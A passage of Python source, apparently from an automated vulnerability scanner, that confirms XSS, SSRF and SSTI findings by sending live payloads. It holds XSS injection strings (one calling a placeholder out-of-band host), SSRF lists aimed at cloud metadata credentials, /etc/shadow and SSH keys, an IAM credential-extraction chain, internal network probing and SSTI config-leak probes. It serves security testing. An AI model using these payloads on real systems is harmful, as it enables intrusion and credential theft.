"""
Vulnerability Confirmation Module

After a vulnerability is DETECTED, this module PROVES it works by actual exploitation:
- SQLi → extract DB version, tables, sample data (handled by deep_sqli already)
- XSS → confirm script reflection in executable context, extract DOM info
- SSRF → read cloud metadata, internal files, prove server-side request
- SSTI → execute expressions, prove template engine evaluation
- CMD Injection → execute unique commands, verify output
- LFI → read sensitive files (/etc/passwd, config files)
- IDOR → access multiple users' data, prove horizontal privilege escalation
- Path Traversal → read files beyond web root
- Auth Bypass → prove access to protected resources
- Info Disclosure → extract and classify sensitive data found

Each confirmation updates the Vulnerability record with:
- response_data["confirmation"] = {proof, extracted_data, exploitation_depth}
- Severity escalation when exploitation proves critical impact
- Title update with "[CONFIRMED]" prefix and exploitation details
"""
import asyncio
import json
import re
import logging
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)


class VulnConfirmer:
    """Confirms and exploits detected vulnerabilities to prove real impact."""

    def __init__(self, rate_limit: asyncio.Semaphore | None = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)
        self._auth_cookie = None
        self._custom_headers: dict = {}

    @staticmethod
    def _capture_exchange(
        resp: httpx.Response,
        method: str,
        url: str,
        payload: str | None = None,
        param: str | None = None,
        body_data: dict | str | None = None,
    ) -> dict:
        """Capture raw HTTP request/response for report evidence.

        Returns {"request": {...}, "response": {...}} suitable for
        request_data and response_data fields.
        """
        req_headers = {}
        try:
            if resp.request and resp.request.headers:
                req_headers = {k: v for k, v in list(resp.request.headers.items())[:15]}
        except Exception:
            pass

        request = {
            "method": method.upper(),
            "url": str(resp.request.url) if resp.request else url,
            "headers": req_headers,
        }
        if body_data:
            request["body"] = str(body_data)[:2000] if isinstance(body_data, (dict, str)) else str(body_data)[:2000]
        if payload:
            request["payload"] = str(payload)[:500]
        if param:
            request["parameter"] = param

        resp_headers = {}
        try:
            resp_headers = {k: v for k, v in list(resp.headers.items())[:15]}
        except Exception:
            pass

        response = {
            "status_code": resp.status_code,
            "headers": resp_headers,
            "body_preview": resp.text[:3000] if resp.text else "",
            "content_length": len(resp.text) if resp.text else 0,
        }

        return {"request": request, "response": response}

    def _http_client(self, **kwargs) -> httpx.AsyncClient:
        extra = dict(self._custom_headers)
        if self._auth_cookie:
            if self._auth_cookie.startswith("token="):
                token = self._auth_cookie.split("=", 1)[1]
                extra["Authorization"] = f"Bearer {token}"
            else:
                extra["Cookie"] = self._auth_cookie
        return make_client(extra_headers=extra, **kwargs)

    async def confirm_all(self, vulnerabilities: list, context: dict, db) -> dict:
        """Confirm all detected vulnerabilities by attempting exploitation.

        Args:
            vulnerabilities: list of Vulnerability ORM objects
            context: scan context dict
            db: async database session

        Returns:
            dict with stats: {confirmed, failed, escalated, total}
        """
        self._auth_cookie = context.get("auth_cookie")
        self._custom_headers = context.get("custom_headers", {})
        base_url = context.get("base_url", "")

        stats = {"confirmed": 0, "failed": 0, "escalated": 0, "total": len(vulnerabilities)}

        for vuln in vulnerabilities:
            try:
                vuln_type = vuln.vuln_type.value if hasattr(vuln.vuln_type, "value") else str(vuln.vuln_type)
                result = await self._confirm_vuln(vuln, vuln_type, base_url, db)
                if result.get("confirmed"):
                    stats["confirmed"] += 1
                    if result.get("escalated"):
                        stats["escalated"] += 1
                else:
                    stats["failed"] += 1
            except Exception as e:
                logger.debug(f"Confirmation error for {vuln.id}: {e}")
                stats["failed"] += 1

        return stats

    async def _confirm_vuln(self, vuln, vuln_type: str, base_url: str, db) -> dict:
        """Confirm a single vulnerability by type-specific exploitation."""
        # Skip if already confirmed
        existing = vuln.response_data or {}
        if existing.get("confirmation", {}).get("confirmed"):
            return {"confirmed": True, "escalated": False}

        # Route to type-specific confirmer
        confirmers = {
            "xss_reflected": self._confirm_xss,
            "xss_stored": self._confirm_xss,
            "xss_dom": self._confirm_xss,
            "xss": self._confirm_xss,
            "ssrf": self._confirm_ssrf,
            "ssti": self._confirm_ssti,
            "cmd_injection": self._confirm_cmd_injection,
            "rce": self._confirm_cmd_injection,
            "sqli": self._confirm_sqli,
            "lfi": self._confirm_lfi,
            "path_traversal": self._confirm_lfi,
            "idor": self._confirm_idor,
            "info_disclosure": self._confirm_info_disclosure,
            "auth_bypass": self._confirm_auth_bypass,
            "open_redirect": self._confirm_open_redirect,
            "cors_misconfiguration": self._confirm_cors,
            "misconfiguration": self._confirm_misconfig,
        }

        confirmer = confirmers.get(vuln_type)
        if not confirmer:
            # No specific confirmer — mark as detection-only
            return {"confirmed": False, "escalated": False}

        result = await confirmer(vuln, base_url)

        # If initial confirmation failed, try KB-sourced payloads as retry
        if not result.get("confirmed") and vuln.url and vuln_type in (
            "xss_reflected", "xss_stored", "sqli", "ssti", "cmd_injection", "ssrf"
        ):
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                # Map confirmer vuln_type to KB vuln_type
                kb_type = vuln_type.split("_")[0] if "_" in vuln_type else vuln_type
                kb_payloads = await kb.get_effective_payloads(db, kb_type)
                if kb_payloads:
                    original_payload = vuln.payload_used
                    for kp in kb_payloads[:5]:  # Try top 5 KB payloads
                        alt_payload = kp.get("payload", "")
                        if not alt_payload or alt_payload == original_payload:
                            continue
                        vuln.payload_used = alt_payload
                        retry = await confirmer(vuln, base_url)
                        if retry.get("confirmed"):
                            result = retry
                            result["method"] = f"KB retry ({result.get('method', '')})"
                            break
                    if not result.get("confirmed"):
                        vuln.payload_used = original_payload  # Restore original
            except Exception as e:
                logger.debug(f"KB retry failed for {vuln.id}: {e}")

        if result.get("confirmed"):
            # Save HTTP request data as evidence
            http_exchange = result.get("http_exchange", {})
            if http_exchange.get("request"):
                vuln.request_data = http_exchange["request"]

            # Update vulnerability with confirmation proof + HTTP response
            response_data = vuln.response_data or {}
            response_data["confirmation"] = {
                "confirmed": True,
                "method": result.get("method", ""),
                "proof": result.get("proof", ""),
                "extracted_data": result.get("extracted_data"),
                "exploitation_depth": result.get("depth", "basic"),
            }
            # Merge HTTP response evidence into response_data
            if http_exchange.get("response"):
                response_data["http_response"] = http_exchange["response"]
            vuln.response_data = response_data

            # Escalate severity if exploitation proved critical impact
            escalate_to = result.get("escalate_to")
            # Also use _escalate_severity if extracted_data is available
            if not escalate_to and result.get("extracted_data"):
                escalate_to = self._escalate_severity(result["extracted_data"])
            if escalate_to:
                from app.models.vulnerability import Severity
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH}
                new_sev = sev_map.get(escalate_to)
                if new_sev and new_sev != vuln.severity:
                    vuln.severity = new_sev
                    result["escalated"] = True

            # Update title with confirmation
            if not vuln.title.startswith("[CONFIRMED]"):
                detail = result.get("title_detail", "")
                vuln.title = f"[CONFIRMED] {vuln.title}" + (f" — {detail}" if detail else "")

            # Update impact with exploitation proof
            if result.get("impact_addition"):
                vuln.impact = (vuln.impact or "") + "\n\n**Exploitation Proof:**\n" + result["impact_addition"]

            await db.flush()

            # Record confirmed payload to KB
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                await kb.record_successful_payload(db, vuln_type, vuln.payload_used, vuln.url)
            except Exception:
                pass

        return result

    # -----------------------------------------------------------------------
    # XSS Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_xss(self, vuln, base_url: str) -> dict:
        """Confirm XSS by sending payload and verifying reflection in executable context.

        Improvements:
        - Checks CSP headers that would block execution
        - Tests attribute escape payloads for attribute-context XSS
        - DOM XSS source-to-sink pattern matching in JS
        - OOB callback verification via img/fetch
        - Multiple confirmation payload strategies
        """
        url = vuln.url
        payload = vuln.payload_used
        method = vuln.method or "GET"

        if not url or not payload:
            return {"confirmed": False}

        # Unique marker for OOB/DOM verification
        import random
        xss_marker = f"PHANTOM_XSS_{random.randint(10000, 99999)}"

        # Try multiple confirmation payloads (with attribute escape and OOB)
        confirm_payloads = [
            payload,  # Original
            f'<img src=x onerror="document.title=\'{xss_marker}\'">',
            '<svg/onload=alert`PHANTOM`>',
            '"><img src=x onerror=alert(document.domain)>',
            # Attribute escape payloads
            f'" onmouseover="alert(\'{xss_marker}\')" data-x="',
            f"' onfocus='alert(`{xss_marker}`)' autofocus='",
            f'" onload="fetch(\'https://phantom-oob.example.com/{xss_marker}\')" x="',
            # Event handler without quotes
            f'"><svg onload=alert({xss_marker})>',
            # JavaScript protocol in href context
            f'javascript:alert("{xss_marker}")',
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=False) as client:
                    for test_payload in confirm_payloads:
                        try:
                            if method.upper() == "POST":
                                param = vuln.parameter or "input"
                                resp = await client.post(url, data={param: test_payload})
                            else:
                                # Inject into URL parameter
                                if vuln.parameter:
                                    parsed = urlparse(url)
                                    params = parse_qs(parsed.query, keep_blank_values=True)
                                    params[vuln.parameter] = [test_payload]
                                    new_query = urlencode(params, doseq=True)
                                    test_url = urlunparse(parsed._replace(query=new_query))
                                else:
                                    test_url = url
                                resp = await client.get(test_url)

                            body = resp.text
                            headers = resp.headers

                            # Check if payload is reflected in executable context
                            if test_payload in body:
                                # Verify it's NOT inside a comment, textarea, or escaped
                                context = self._xss_context_check(test_payload, body)
                                if context["executable"]:
                                    # Check CSP headers
                                    csp_blocks = self._check_csp_blocks_xss(headers)

                                    result = {
                                        "confirmed": True,
                                        "method": f"Payload reflected in {context['context']}",
                                        "proof": f"Payload '{test_payload[:80]}' reflected unescaped in HTTP response ({context['context']})",
                                        "extracted_data": {
                                            "reflected_payload": test_payload[:200],
                                            "response_context": context["context"],
                                            "response_snippet": context["snippet"][:500],
                                        },
                                        "depth": "reflected_xss",
                                        "title_detail": f"Reflected in {context['context']}",
                                        "impact_addition": f"XSS payload `{test_payload[:80]}` was reflected unescaped in the response body within {context['context']} context. This allows arbitrary JavaScript execution in victim's browser.",
                                        "http_exchange": self._capture_exchange(
                                            resp, method, url, test_payload, vuln.parameter,
                                            {vuln.parameter or "input": test_payload} if method.upper() == "POST" else None,
                                        ),
                                    }

                                    if csp_blocks:
                                        result["extracted_data"]["csp_note"] = csp_blocks
                                        result["impact_addition"] += f"\n\nNote: CSP may restrict exploitation: {csp_blocks}"
                                    else:
                                        result["extracted_data"]["csp_note"] = "No restrictive CSP — full exploitation possible"

                                    return result
                        except Exception:
                            continue

                    # DOM XSS detection: check for source-to-sink patterns in JavaScript
                    try:
                        dom_result = await self._check_dom_xss(client, url, vuln.parameter)
                        if dom_result.get("confirmed"):
                            return dom_result
                    except Exception:
                        pass

            except Exception:
                pass

        return {"confirmed": False}

    def _check_csp_blocks_xss(self, headers) -> str | None:
        """Check if Content-Security-Policy blocks inline script execution."""
        csp = headers.get("content-security-policy", "")
        if not csp:
            return None

        blocks = []
        csp_lower = csp.lower()

        # Check script-src
        if "script-src" in csp_lower:
            if "'none'" in csp_lower:
                blocks.append("script-src 'none' blocks all scripts")
            elif "'self'" in csp_lower and "'unsafe-inline'" not in csp_lower:
                blocks.append("script-src restricts to 'self' without 'unsafe-inline'")
            elif "'nonce-" in csp_lower or "'strict-dynamic'" in csp_lower:
                blocks.append("script-src uses nonce/strict-dynamic")

        # Check default-src as fallback
        if not blocks and "default-src" in csp_lower:
            if "'none'" in csp_lower:
                blocks.append("default-src 'none' blocks scripts")
            elif "'self'" in csp_lower and "'unsafe-inline'" not in csp_lower:
                blocks.append("default-src restricts inline scripts")

        return "; ".join(blocks) if blocks else None

    async def _check_dom_xss(self, client, url: str, param: str | None) -> dict:
        """Check for DOM-based XSS by analyzing JavaScript source-to-sink patterns."""
        try:
            resp = await client.get(url)
            body = resp.text

            # Extract inline scripts
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE)
            js_content = "\n".join(scripts)

            # Also check for JS file references and fetch them
            js_files = re.findall(r'<script[^>]+src=["\']([^"\']+\.js)["\']', body, re.IGNORECASE)
            parsed = urlparse(url)
            for js_file in js_files[:3]:  # Limit to 3 JS files
                if js_file.startswith("//"):
                    js_url = f"{parsed.scheme}:{js_file}"
                elif js_file.startswith("/"):
                    js_url = f"{parsed.scheme}://{parsed.netloc}{js_file}"
                elif js_file.startswith("http"):
                    js_url = js_file
                else:
                    js_url = f"{parsed.scheme}://{parsed.netloc}/{js_file}"
                try:
                    js_resp = await client.get(js_url)
                    if js_resp.status_code == 200:
                        js_content += "\n" + js_resp.text[:50000]  # Limit size
                except Exception:
                    continue

            if not js_content:
                return {"confirmed": False}

            # DOM XSS sources
            sources = [
                r"document\.location", r"document\.URL", r"document\.documentURI",
                r"document\.referrer", r"window\.location", r"location\.hash",
                r"location\.search", r"location\.href", r"document\.cookie",
                r"window\.name", r"postMessage",
            ]
            # DOM XSS sinks
            sinks = [
                r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write\s*\(",
                r"document\.writeln\s*\(", r"eval\s*\(", r"setTimeout\s*\(",
                r"setInterval\s*\(", r"Function\s*\(", r"\.src\s*=",
                r"\.href\s*=", r"\.action\s*=", r"jQuery\s*\(", r"\$\s*\(",
            ]

            found_sources = []
            found_sinks = []
            for src in sources:
                if re.search(src, js_content):
                    found_sources.append(src.replace("\\", ""))
            for sink in sinks:
                if re.search(sink, js_content):
                    found_sinks.append(sink.replace("\\", ""))

            # Check for direct source-to-sink flow patterns
            dangerous_patterns = [
                r"\.innerHTML\s*=\s*.*(?:location|document\.URL|document\.referrer|window\.name)",
                r"document\.write\s*\(.*(?:location|document\.URL|document\.referrer)",
                r"eval\s*\(.*(?:location|document\.URL|decodeURI)",
                r"\$\s*\(.*(?:location\.hash|location\.search)",
                r"jQuery\s*\(.*(?:location\.hash|location\.search)",
            ]

            direct_flows = []
            for pat in dangerous_patterns:
                matches = re.findall(pat, js_content[:100000])
                if matches:
                    direct_flows.extend(matches[:2])

            if direct_flows:
                return {
                    "confirmed": True,
                    "method": "DOM XSS: source-to-sink flow detected",
                    "proof": f"JavaScript contains direct data flow from user-controlled source to dangerous sink",
                    "extracted_data": {
                        "sources": found_sources[:5],
                        "sinks": found_sinks[:5],
                        "dangerous_flows": [f[:200] for f in direct_flows[:3]],
                    },
                    "depth": "dom_xss",
                    "escalate_to": "high",
                    "title_detail": "DOM XSS Source-to-Sink Flow",
                    "impact_addition": f"DOM XSS detected: JavaScript contains direct data flow from user input sources ({', '.join(found_sources[:3])}) to dangerous sinks ({', '.join(found_sinks[:3])}). Exploitation possible via crafted URL.",
                }
            elif found_sources and found_sinks:
                # Sources and sinks exist but no direct flow proven
                return {
                    "confirmed": True,
                    "method": "DOM XSS: sources and sinks present",
                    "proof": f"JavaScript uses {len(found_sources)} user-controlled sources and {len(found_sinks)} dangerous sinks",
                    "extracted_data": {
                        "sources": found_sources[:5],
                        "sinks": found_sinks[:5],
                    },
                    "depth": "dom_xss_potential",
                    "title_detail": "Potential DOM XSS",
                    "impact_addition": f"Potential DOM XSS: {len(found_sources)} sources and {len(found_sinks)} sinks detected in JavaScript. Manual verification recommended.",
                }

        except Exception:
            pass

        return {"confirmed": False}

    def _xss_context_check(self, payload: str, body: str) -> dict:
        """Check what context an XSS payload landed in."""
        idx = body.find(payload)
        if idx == -1:
            return {"executable": False, "context": "not_found", "snippet": ""}

        # Get surrounding context
        start = max(0, idx - 200)
        end = min(len(body), idx + len(payload) + 200)
        snippet = body[start:end]

        # Check if inside HTML comment
        before = body[max(0, idx - 500):idx]
        if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
            return {"executable": False, "context": "html_comment", "snippet": snippet}

        # Check if inside <textarea>, <title>, <style>, <noscript>
        safe_tags = ["textarea", "title", "style", "noscript"]
        for tag in safe_tags:
            open_tag = f"<{tag}"
            close_tag = f"</{tag}"
            last_open = before.lower().rfind(open_tag)
            last_close = before.lower().rfind(close_tag)
            if last_open > last_close:
                return {"executable": False, "context": f"inside_{tag}", "snippet": snippet}

        # Check if HTML-encoded
        import html
        if html.escape(payload) in body and payload not in body:
            return {"executable": False, "context": "html_encoded", "snippet": snippet}

        # Check if inside an attribute with encoding (e.g., value="&lt;script&gt;")
        # Look for the attribute context around the payload
        attr_before = body[max(0, idx - 100):idx]
        if re.search(r'=\s*["\'][^"\']*$', attr_before):
            # We're inside an attribute value
            # Check if the attribute value has HTML encoding
            attr_match = re.search(r'(\w+)\s*=\s*["\']([^"\']*?)$', attr_before)
            if attr_match:
                attr_name = attr_match.group(1).lower()
                # Event handler attributes are executable
                if attr_name.startswith("on"):
                    return {"executable": True, "context": f"event_handler_{attr_name}", "snippet": snippet}
                # href with javascript: is executable
                if attr_name in ("href", "src", "action") and "javascript:" in payload.lower():
                    return {"executable": True, "context": f"js_protocol_in_{attr_name}", "snippet": snippet}
                # data-* and non-executable attributes are safe
                if attr_name in ("value", "placeholder", "title", "alt", "data"):
                    return {"executable": False, "context": f"safe_attribute_{attr_name}", "snippet": snippet}

        # Check for script/event handler context
        if "<script" in payload.lower() or "onerror" in payload.lower() or "onload" in payload.lower():
            return {"executable": True, "context": "html_body_with_handler", "snippet": snippet}

        # Inside an attribute value
        attr_pattern = re.search(r'(?:value|href|src|action)\s*=\s*["\']?' + re.escape(payload[:20]), snippet, re.I)
        if attr_pattern:
            return {"executable": True, "context": "html_attribute", "snippet": snippet}

        return {"executable": True, "context": "html_body", "snippet": snippet}

    # -----------------------------------------------------------------------
    # SSRF Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_ssrf(self, vuln, base_url: str) -> dict:
        """Confirm SSRF by reading internal resources / cloud metadata.

        Improvements:
        - AWS credential chain: get role name -> get full creds
        - Internal service data extraction
        - Internal IP range scanning via SSRF
        - Severity escalation based on what was accessed
        """
        url = vuln.url
        method = vuln.method or "GET"
        param = vuln.parameter

        if not url or not param:
            return {"confirmed": False}

        # Escalation payloads: try to read increasingly sensitive data
        ssrf_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "GCP metadata"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP service account token"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity token"),
            ("http://127.0.0.1:6379/INFO", "Local Redis"),
            ("http://127.0.0.1:27017/", "Local MongoDB"),
            ("http://127.0.0.1:9200/_cluster/health", "Local Elasticsearch"),
            ("http://127.0.0.1:5984/_all_dbs", "Local CouchDB"),
            ("http://127.0.0.1:8500/v1/agent/members", "Local Consul"),
            ("file:///etc/passwd", "Local file read"),
            ("file:///etc/shadow", "Shadow file read"),
            ("file:///etc/hostname", "Hostname read"),
            ("file:///proc/self/environ", "Process environment"),
            ("file:///root/.ssh/id_rsa", "SSH private key"),
            ("file:///home/ubuntu/.aws/credentials", "AWS credential file"),
            ("http://127.0.0.1:80/", "Localhost HTTP"),
            ("http://127.0.0.1:8080/", "Localhost 8080"),
            ("http://127.0.0.1:3000/", "Localhost 3000"),
        ]

        all_extracted = {}
        best_result = None
        best_severity = None

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for target_url, desc in ssrf_targets:
                        try:
                            resp = await self._ssrf_send(client, url, param, method, target_url)
                            if resp is None:
                                continue

                            body = resp.text
                            extracted = self._analyze_ssrf_response(body, desc)
                            if extracted:
                                all_extracted.update(extracted)

                                # Determine severity based on what was accessed
                                severity = self._ssrf_severity(extracted, desc)
                                if best_severity is None or self._sev_rank(severity) > self._sev_rank(best_severity):
                                    best_severity = severity
                                    best_result = {
                                        "confirmed": True,
                                        "method": f"SSRF to {desc}",
                                        "proof": f"Server fetched {target_url} and returned internal data",
                                        "extracted_data": dict(all_extracted),
                                        "depth": "data_extraction",
                                        "escalate_to": severity,
                                        "title_detail": f"Read {desc}",
                                        "impact_addition": f"SSRF confirmed: server-side request to `{target_url}` returned internal data:\n```\n{json.dumps(extracted, indent=2)[:500]}\n```",
                                        "http_exchange": self._capture_exchange(
                                            resp, method, url, target_url, param,
                                        ),
                                    }

                                # AWS credential chain: if we found IAM role list, get full creds
                                if "iam" in desc.lower() and body.strip() and "AccessKeyId" not in body:
                                    role_name = body.strip().split("\n")[0].strip()
                                    if role_name and not role_name.startswith("<"):
                                        creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
                                        creds_resp = await self._ssrf_send(client, url, param, method, creds_url)
                                        if creds_resp:
                                            creds_body = creds_resp.text
                                            creds_extracted = self._analyze_ssrf_response(creds_body, "AWS IAM full credentials")
                                            if creds_extracted:
                                                all_extracted.update(creds_extracted)
                                                all_extracted["iam_role"] = role_name
                                                best_severity = "critical"
                                                best_result = {
                                                    "confirmed": True,
                                                    "method": f"SSRF → AWS IAM credential extraction (role: {role_name})",
                                                    "proof": f"Chained SSRF: discovered IAM role '{role_name}' and extracted full credentials",
                                                    "extracted_data": dict(all_extracted),
                                                    "depth": "credential_extraction",
                                                    "escalate_to": "critical",
                                                    "title_detail": f"AWS IAM Credentials Stolen (role: {role_name})",
                                                    "impact_addition": f"Critical SSRF chain: discovered IAM role `{role_name}` and extracted AWS credentials. Full AWS account compromise possible.",
                                                    "http_exchange": self._capture_exchange(
                                                        creds_resp, method, url, creds_url, param,
                                                    ),
                                                }

                        except Exception:
                            continue

                    # Internal IP range scan via SSRF (quick scan of common internal IPs)
                    if best_result:
                        internal_scan = await self._ssrf_internal_scan(client, url, param, method)
                        if internal_scan:
                            all_extracted["internal_services"] = internal_scan
                            best_result["extracted_data"] = dict(all_extracted)
                            best_result["impact_addition"] += f"\n\nInternal network scan: {len(internal_scan)} reachable services found."

            except Exception:
                pass

        return best_result if best_result else {"confirmed": False}

    async def _ssrf_send(self, client, url, param, method, target_url) -> httpx.Response | None:
        """Send an SSRF request via the vulnerable parameter."""
        try:
            if method.upper() == "POST":
                resp = await client.post(url, data={param: target_url})
            else:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [target_url]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                resp = await client.get(test_url)
            return resp
        except Exception:
            return None

    async def _ssrf_internal_scan(self, client, url, param, method) -> list[dict]:
        """Quick scan of common internal services via SSRF."""
        services = []
        scan_targets = [
            ("http://10.0.0.1/", "Internal gateway 10.0.0.1"),
            ("http://172.17.0.1/", "Docker gateway"),
            ("http://192.168.1.1/", "Internal gateway 192.168.1.1"),
            ("http://127.0.0.1:8080/", "Local Tomcat/App"),
            ("http://127.0.0.1:9090/", "Local Prometheus"),
            ("http://127.0.0.1:3306/", "Local MySQL"),
            ("http://127.0.0.1:5432/", "Local PostgreSQL"),
            ("http://kubernetes.default.svc/", "Kubernetes API"),
        ]

        for target_url, desc in scan_targets:
            try:
                resp = await self._ssrf_send(client, url, param, method, target_url)
                if resp and resp.status_code == 200 and len(resp.text) > 10:
                    services.append({
                        "url": target_url,
                        "description": desc,
                        "status": resp.status_code,
                        "content_length": len(resp.text),
                        "snippet": resp.text[:100],
                    })
            except Exception:
                continue

        return services

    def _ssrf_severity(self, extracted: dict, desc: str) -> str:
        """Determine severity based on SSRF extraction results."""
        # Credentials found = critical
        if extracted.get("iam_leak") or extracted.get("AccessKeyId"):
            return "critical"
        if extracted.get("service_account_token"):
            return "critical"
        if any(k in extracted for k in ["ssh_key", "aws_creds_file"]):
            return "critical"
        # Shadow file or SSH keys = critical
        if "shadow" in desc.lower() or "private key" in desc.lower() or "credential file" in desc.lower():
            return "critical"
        # Cloud metadata = critical (can lead to creds)
        if "metadata" in desc.lower() or "iam" in desc.lower():
            return "critical"
        # File read = high
        if extracted.get("file_read") or "file" in desc.lower():
            return "high"
        # Internal service access = high
        if extracted.get("service"):
            return "high"
        # Process environment = critical (often contains secrets)
        if "environ" in desc.lower():
            return "critical"
        return "high"

    @staticmethod
    def _sev_rank(severity: str | None) -> int:
        """Numeric rank for severity comparison."""
        return {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(severity or "", -1)

    def _analyze_ssrf_response(self, body: str, desc: str) -> dict | None:
        """Extract meaningful data from SSRF response."""
        data = {}

        # AWS metadata
        if "ami-id" in body or "instance-id" in body:
            data["cloud"] = "AWS"
            for field in ["ami-id", "instance-id", "instance-type", "local-ipv4", "public-ipv4"]:
                match = re.search(rf"{field}[\":\s]+([^\s\"<,]+)", body)
                if match:
                    data[field] = match.group(1)

        # AWS IAM credentials
        if "AccessKeyId" in body:
            data["cloud"] = "AWS"
            data["iam_leak"] = True
            for field in ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"]:
                match = re.search(rf'"{field}"\s*:\s*"([^"]+)"', body)
                if match:
                    data[field] = match.group(1)[:20] + "..." if len(match.group(1)) > 20 else match.group(1)

        # GCP metadata
        if "computeMetadata" in body or "project-id" in body.lower():
            data["cloud"] = "GCP"
            data["metadata_content"] = body[:300]

        # GCP service account token
        if "access_token" in body and "token_type" in body:
            data["cloud"] = data.get("cloud", "GCP")
            data["service_account_token"] = True
            match = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
            if match:
                data["access_token"] = match.group(1)[:20] + "..."

        # Azure managed identity token
        if "access_token" in body and "azure" in desc.lower():
            data["cloud"] = "Azure"
            data["managed_identity_token"] = True
            match = re.search(r'"access_token"\s*:\s*"([^"]+)"', body)
            if match:
                data["azure_token"] = match.group(1)[:20] + "..."

        # /etc/passwd
        if "root:x:" in body:
            data["file_read"] = "/etc/passwd"
            users = re.findall(r"^([^:]+):x:(\d+):", body, re.MULTILINE)
            data["users"] = [{"name": u[0], "uid": u[1]} for u in users[:10]]

        # /etc/shadow
        if re.search(r"root:\$\d\$", body):
            data["file_read"] = "/etc/shadow"
            data["shadow_hashes"] = True

        # Process environment
        if "PATH=" in body and "\x00" in body:
            data["file_read"] = "/proc/self/environ"
            env_pairs = re.findall(r"([A-Z_]+)=([^\x00]+?)(?:\x00|$)", body)
            data["environment"] = {k: v[:50] for k, v in env_pairs[:15]}
            # Check for secrets in env
            for k, v in env_pairs:
                if any(s in k.upper() for s in ["SECRET", "KEY", "PASSWORD", "TOKEN", "API"]):
                    data["env_secrets"] = data.get("env_secrets", {})
                    data["env_secrets"][k] = v[:30] + "..."

        # SSH private key
        if "BEGIN" in body and "PRIVATE KEY" in body:
            data["ssh_key"] = True
            data["file_read"] = desc

        # AWS credential file
        if "aws_access_key_id" in body.lower():
            data["aws_creds_file"] = True
            match = re.search(r"aws_access_key_id\s*=\s*(\S+)", body, re.I)
            if match:
                data["aws_key"] = match.group(1)[:10] + "..."

        # Redis
        if "redis_version" in body:
            data["service"] = "redis"
            match = re.search(r"redis_version:(\S+)", body)
            if match:
                data["redis_version"] = match.group(1)

        # Elasticsearch
        if "cluster_name" in body or "cluster_uuid" in body:
            data["service"] = "elasticsearch"
            try:
                es_data = json.loads(body)
                data["es_cluster"] = es_data.get("cluster_name", "")
                data["es_status"] = es_data.get("status", "")
            except Exception:
                data["es_info"] = body[:200]

        # MongoDB
        if "ismaster" in body.lower() or "mongodb" in body.lower():
            data["service"] = "mongodb"
            data["mongo_info"] = body[:200]

        # Consul
        if "Member" in body and "Tags" in body:
            data["service"] = "consul"
            data["consul_info"] = body[:300]

        # Kubernetes
        if "kubernetes" in body.lower() or "apiVersion" in body:
            data["service"] = "kubernetes"
            data["k8s_info"] = body[:300]

        return data if data else None

    # -----------------------------------------------------------------------
    # SSTI Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_ssti(self, vuln, base_url: str) -> dict:
        """Confirm SSTI by executing template expressions."""
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url or not param:
            return {"confirmed": False}

        # Increasingly dangerous SSTI payloads (read-only, no writes)
        ssti_probes = [
            # Unique math that can't appear naturally
            ("{{1337*1337}}", "1787569", "Jinja2/Twig math"),
            ("${1337*1337}", "1787569", "FreeMarker/Velocity math"),
            ("#{1337*1337}", "1787569", "Ruby ERB/Pebble math"),
            ("<%= 1337*1337 %>", "1787569", "ERB math"),
            # String operations
            ("{{\"PHANTOM\"*3}}", "PHANTOMPHANTOMPHANTOM", "Jinja2 string repeat"),
            # Config/env leak
            ("{{config}}", "SECRET_KEY", "Flask config leak"),
            ("{{settings.SECRET_KEY}}", "", "Django settings leak"),
            # OS info (read-only)
            ("{{self.__class__.__mro__}}", "object", "Jinja2 MRO access"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in ssti_probes:
                        try:
                            if method.upper() == "POST":
                                resp = await client.post(url, data={param: payload})
                            else:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [payload]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                                resp = await client.get(test_url)

                            body = resp.text

                            # Check for expected output (the raw template must NOT be in response)
                            if expected and expected in body and payload not in body:
                                # Confirmed: engine evaluated our expression
                                escalate = "critical" if "config" in desc.lower() or "MRO" in desc.lower() else "high"
                                return {
                                    "confirmed": True,
                                    "method": desc,
                                    "proof": f"Template engine evaluated `{payload}` → found `{expected}` in response",
                                    "extracted_data": {
                                        "template_engine": desc.split()[0],
                                        "payload": payload,
                                        "evaluation_result": expected,
                                        "response_snippet": body[body.find(expected)-50:body.find(expected)+100][:300],
                                    },
                                    "depth": "code_execution",
                                    "escalate_to": escalate,
                                    "title_detail": f"{desc} — Code Execution",
                                    "impact_addition": f"SSTI confirmed: `{payload}` was evaluated by the template engine, producing `{expected}`. This proves server-side code execution capability.",
                                    "http_exchange": self._capture_exchange(
                                        resp, method, url, payload, param,
